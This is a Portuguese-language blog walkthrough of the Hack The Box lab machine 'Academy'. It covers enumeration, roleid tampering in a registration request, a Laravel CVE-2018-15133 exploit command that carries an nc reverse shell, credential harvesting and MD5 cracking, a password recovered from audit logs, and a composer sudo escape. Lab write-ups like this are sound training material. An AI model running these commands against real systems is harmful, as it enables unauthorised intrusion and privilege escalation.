---
layout: single
title: "Hackthebox write-up: Academy"
namespace: htb-academy
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-02-27 16:00:00
header:
   teaser: https://i.imgur.com/PjYV5g5.png
---

Olá pessoal!

A máquina desta semana será **Academy**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [egre55](https://app.hackthebox.eu/users/1190) e [mrb3n](https://app.hackthebox.eu/users/2984).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
{: .notice--info}

![HTB Academy](https://i.imgur.com/3SXgHMd.png){: .align-center}

## Enumeração

Iniciado enumeração, como de costume, executando um scan rápido do `nmap` para vermos o que está em execução nesta máquina.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.215
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 12:32 -03
Nmap scan report for 10.10.10.215
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.43 seconds
```

### 80 TCP - Serviço HTTP

Verificando este serviço do scan do `nmap`, notei que a página contém um redirect para o host **academy.htb**, que é provavelmente o nome pelo qual esta máquina responde e que minha máquina não conseguiu resolver. Após adicioná-lo no meu arquivo `/etc/hosts`, foi possível navegar para a página abaixo, que contém dois links: um para registro e outro para login na página do serviço HTB Academy.

![HTB Academy - 80/TCP](https://i.imgur.com/jPgHc5K.png){: .align-center}

Como o código fonte da página não continha nada oculto, segui com a criação de uma conta para testes (`dummy:P@ssword`) para obter algum acesso no serviço. Durante a criação da conta notei algo interessante enviado no POST request, onde um campo oculto do formulário enviava o parametro **roleid**, definindo seu valor para **0**.

```bash
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 57
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i
Connection: close

uid=dummy&password=P%40ssw0rd&confirm=P%40ssw0rd&roleid=0
```

Vamos dar continuidade com os valores padrão por enquanto embora já saibamos de uma oportunidade de adulterar este parametro se necessário.

Depois de acessar o serviço com a credencial recentemente criada, notei que o usuário é capaz de ver o catálogo de serviços, com alguns créditos pré-carregados, porém nenhuma operação (unlock) foi possível uma vez que a API estava indisponível (`http://academy.htb/api/modules/unlock`), retornando erro HTTP 404.

![HTB Academy - Logged in](https://i.imgur.com/ZWqyaUH.png){: .align-center}

### Gobuster

Uma vez que chegamos neste fim de linha, decidi por iniciar um brute force nos diretórios deste app para identificar alguma feature oculta que pudesse nos levar a um acesso inicial. Executando o `gobuster` pudemos encontrar 2 itens interessantes a serem investigados: **admin.php** e **config.php**.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb -t 50 -o gobuster_80.txt -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2021/02/17 12:51:55 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/home.php (Status: 200)
/register.php (Status: 200)
/admin.php (Status: 200)
/config.php (Status: 200)
Progress: 48339 / 220561 (21.92%)in.php (Status: 200)

```

### admin.php

Acessando `admin.php` notei que a tela de logon se parece bastante com a tela de login anterior, porém nossas credenciais de testes não funcionaram. Lembrando que temos uma oportunidade de adulterar detalhes da criação do usuário, decidi por criar uma nova conta, desta vez alterando o parametro **roleid** substituindo o valor 0 no request por 1. Com esta nova conta, cujo roleid=**1**, consegui acessar a área restrita, onde o conteúdo abaixo doi exibido:

![HTB Academy - Admin Page](https://i.imgur.com/s54Fy4z.png){: .align-center}

Embora não possua nenhuma informação oculta no fonte, o que chamou atenção foi o host **dev-staging-01.academy.htb**, que possivelmente também encontra-se em execução nesta máquina.

Após adicionar este host no arquivo hosts sob o mesmo endereço IP da máquina, o conteúdo abaixo foi exibido, que é um framework para tratativa de erros no PHP que permite aos desenvolvedores debugar seu código, mas neste caso estava aberto e vazando uma série de informações como credenciais e variáveis de ambiente.

![HTB Academy - DevSta](https://i.imgur.com/EdXyUeb.png){: .align-center}

O que mais chamou a atenção dentre os dados vazados foram as credenciais de MySQL e App_key do Laravel, que podem nos levar a um acesso inicial nesta máquina.

## Acesso inicial

Como não temos a porta MySQL 3306/TCP aberta nesta máquina, com base no scan inicial do nmap, fazendo uma rápida pesquisa na internet pelo que seria possível alcançar com a App_key do Laravel encontrei o [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) que pode nos levar a uma execução remota de código através de uma chamada de deserialização em algumas versões afetadas do Laravel. Se tivermos sorte isto deve funcionar para esta máquina :smiley:.

Realizando algumas pesquisas adicionais, encontrei [este repositório](https://github.com/aljavier/exploit_laravel_cve-2018-15133) que implementa este exploit de uma forma simples e que foi utilizado para obter um shell reverso nesta máquina.

```bash
python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
```

## User flag

Após realizar o upgrade do shell reverso, primeira coisa a se checar foi o arquivo **config.php** enumerado anteriormente, o qual encontra-se listado abaixo:

```bash
www-data@academy:/var/www/html$ cat ./academy/public/config.php 
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
```

Conectando à instancia local do MySQL utilizando das credenciais obtidas, notei que haviam alguns usuários criados na base, assim como o hash de suas senhas, que poderiam ter sido reutilizadas por algum dos usuários existentes nesta máquina.

```bash
$ mysql -u root -p
Password:

mysql> use academy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from users;
+----+----------+----------------------------------+--------+---------------------+
| id | username | password                         | roleid | created_at          |
+----+----------+----------------------------------+--------+---------------------+
|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
| 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 |
| 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 |
| 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 |
| 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 |
+----+----------+----------------------------------+--------+---------------------+
```

Após algumas buscas, descobri que estes hashes foram gerados com MD5 antes de armazenados no banco. Utilizando alguns serviços online, as seguintes senhas foram obtidas:

- dev: **mySup3rP4s5w0rd!!**
- test8: **test8**
- test: **test**
- test2: **test2**
- tester: **test**

Agora que temos algumas senhas, precisamos validar qual usuário possivelmente possui a flag de user.txt. Executando o comando abaixo identificamos o arquivo no diretório do user **cry0l1t3**, para o qual tentaremos as senhas obtidas até o momento:

```bash
www-data@academy:/home$ find /home -type f 2>/dev/null | grep user.txt
/home/cry0l1t3/user.txt
```

Na primeira tentativa, utilizando `mySup3rP4s5w0rd!!` consegui logar com a conta cry0l1t3 e obter a flag de usuário.

```bash
cry0l1t3@academy:~$ cat user.txt 
<redacted>
```

## Root flag

Agora executando com a conta cry0l1t3, podemos seguir com a enumeração desta máquina. A primeira coisa a se fazer é checar o que este usuário é capaz de executar. O usuário `cry0l1t3` não pode executar nada como root, baseado no output do comando `sudo -l` , porém é membro do grupo **adm**, que permite a leitura dos conteúdos do diretório `/var/log` onde alguma informação sensível pode ser vazada.

```bash
cry0l1t3@academy:~$ sudo -l
[sudo] password for cry0l1t3: 
Sorry, user cry0l1t3 may not run sudo on academy.
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

Sempre que inspecionando logs em máquinas de CTF é importante considerar a sua data de criação, permitindo que os registros dos outros jogadores sejam ignorados na verificação. Uma forma simples de se alcançar isso é através do comando abaixo, que filtra apenas os arquivos mais antigos que X dias, no meu caso 100 que é o período de dias desde que esta máquina foi lançada no momento que estou resolvendo a mesma.

```bash
find /var/log -mtime +100 -print 2>/dev/null
```

Verificando primeiro os logs do apache, nada interessante foi encontrado a partir dos access logs logo, na sequência, os logs de auditoria e de cron são os próximos a serem validados.

Verificando os logs de auditoria podemos ver 2 arquivos do período mencionado, que serão inspecionados a seguir.

```bash
cry0l1t3@academy:~$ find . -mtime +100 -print 2>/dev/null | grep audit
/var/log/audit/audit.log.2
/var/log/audit/audit.log.3
```

Buscando por comandos interessantes que foram auditados (`sudo`, `su`, `passwd`) e que possivelmente poderiam conter algum dado sensível, tive sorte e encontrei uma execução de **su**:

```bash
cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '"su"'
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

O campo *data* contém um valor em HEX do parametro utilizado nesta execução, que pode ser convertido para ASCII. Você pode utilizar qualquer conversor online mas também pode utilizar o `vim` para esta tarefa, conforme descrito abaixo:

- Abrir um arquivo em modo de ediçaõ com `vim`

  ```bash
  vi /tmp/test
  ```

- Pressione `Esc` para entrar em modo de comando e digite `:% !xxd`. Isto irá converter o conteúdo atual do arquivo para hexadecimal.

- Agora pressionando a tecla `i` vai ativar o modo de inserção (insert mode), onde vamos colar o conteúdo HEX obtido logo após o valor `00000000:`.

- Pressionando `Esc` novamente para retornar no modo commando e digitando `:% !xxd -r` fará que o conteudo exa seja convertido para ASCII.

- Você poderá salvar e sair a partir do comando `:wq!`  mas neste momento já deve ter visto o conteúdo convertido do valor HEX. Abaixo o output do arquivo que criei para realizar esta conversão:

  ```bash
  cat /tmp/test                    
  mrb3n_Ac@d3my!
  ```

Como **mrb3n** é um dos usuários desta máquina este pode ser possivelmente a sua senha, o que foi confirmado a partir da execuçaõ do comando `su mrb3n` e digitando a senha encontrada.

Enumerando suas permissões, notei que ele não é membro de nenhum grupo especial na máquina porém possui privilégios para executar o binário **composer** com privilégios de root.

```bash
mrb3n@academy:~$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

### Abusando das permissões de `sudo`

Buscando no [GTFOBins](https://gtfobins.github.io/gtfobins/composer/) vi que é possivel escalar privilégios utilizando o composer a partir da execução do snippet abaixo, que funcionou sem grandes problemas:

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

Como **root**, finalmente obtive a flag no caminho `/root/root.txt`

```bash
root@academy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@academy:~# cat root.txt 
<redacted>
root@academy:~#
```

Espero que tenham gostado!

Vejo vocês novamente em breve! :smiley:
